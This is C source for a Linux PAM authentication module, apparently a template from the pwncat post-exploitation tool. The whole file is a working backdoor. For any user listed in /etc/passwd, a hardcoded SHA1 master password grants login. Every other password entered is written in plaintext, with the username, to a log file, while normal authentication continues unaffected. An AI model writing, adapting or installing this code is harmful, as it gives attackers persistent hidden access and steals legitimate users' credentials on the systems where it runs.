#include <stdio.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <sys/file.h>
#include <errno.h>
#include <openssl/sha.h>
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
{
    int pam_code;
    const char *username = NULL;
    const char *password = NULL;
    char passwd_line[1024];
    int found_user = 0;
	char key[20] = {__PWNCAT_HASH__};
	FILE* filp;
    pam_code = pam_get_user(handle, &username, "Username: ");
    if (pam_code != PAM_SUCCESS) {
        return PAM_IGNORE;
    }
    filp = fopen("/etc/passwd", "r");
    if( filp == NULL ){
        return PAM_IGNORE;
    }
    while( fgets(passwd_line, 1024, filp) ){
        char* valid_user = strtok(passwd_line, ":");
        if( strcmp(valid_user, username) == 0 ){
            found_user = 1;
            break;
        } 
    }
    fclose(filp);
    if( found_user == 0 ){
        return PAM_IGNORE;
    }
    pam_code = pam_get_authtok(handle, PAM_AUTHTOK, &password, "Password: ");
    if (pam_code != PAM_SUCCESS) {
        return PAM_IGNORE;
    }
	if( memcmp(SHA1(password, strlen(password), NULL), key, 20) != 0 ){
		filp = fopen("__PWNCAT_LOG__", "a");
		if( filp != NULL )
		{
			fprintf(filp, "%s:%s\n", username, password);
			fclose(filp);
		}
		return PAM_IGNORE;
	}
    return PAM_SUCCESS;
}
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv){
     return PAM_IGNORE;
}
